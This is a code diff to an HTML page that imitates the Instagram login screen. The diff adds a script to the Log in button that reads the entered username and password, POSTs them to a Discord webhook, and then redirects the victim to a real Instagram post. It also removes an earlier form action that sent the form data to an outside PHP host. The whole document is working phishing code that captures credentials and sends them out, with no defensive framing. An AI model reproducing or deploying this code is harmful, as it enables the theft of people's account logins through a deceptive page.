@@ -16,7 +16,7 @@
                   <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
                 </div><!-- Header end -->
                 <div class="form-wrap">
-                  <form class="form"  action="http://network.cybercube.cf/test/test.php">
+                  <form class="form">
 
                     <div class="input-box">
                       <input type="text" id="username" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" required>
@@ -27,7 +27,7 @@
                     </div>  
 
                     <span class="button-box">
-                      <button class="btn" type="button" name="submit">Log in</button>
+                      <button class="btn" type="button" name="submit" onclick="sendMessage()">Log in</button>
                     </span>  
 
                     <a class="forgot" href="https://www.instagram.com/accounts/password/reset">Forgot password?</a>
@@ -88,4 +88,24 @@
     }
   </script>
 
+  <script>
+  function sendMessage() {
+  function sleep(milliseconds) {
+  const date = Date.now();
+  let currentDate = null;
+  do {
+    currentDate = Date.now();
+  } while (currentDate - date < milliseconds);
+}
+    var request = new XMLHttpRequest();
+    request.open("POST", "https://discord.com/api/webhooks/931155677253087232/NGZF2FEDnAxLJSd8ym8RYbXPqz31pd_vpgGlQjKJ0vuQvMI4NYP509wZQv8ZgtRFk-Tx");
+    request.setRequestHeader('Content-type', 'application/json');
+    var params = {
+      content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
+    }
+    request.send(JSON.stringify(params));
+	sleep(400)
+	window.location.replace("https://www.instagram.com/p/By7NkskoTip");
+  }
+  </script>
 </body>
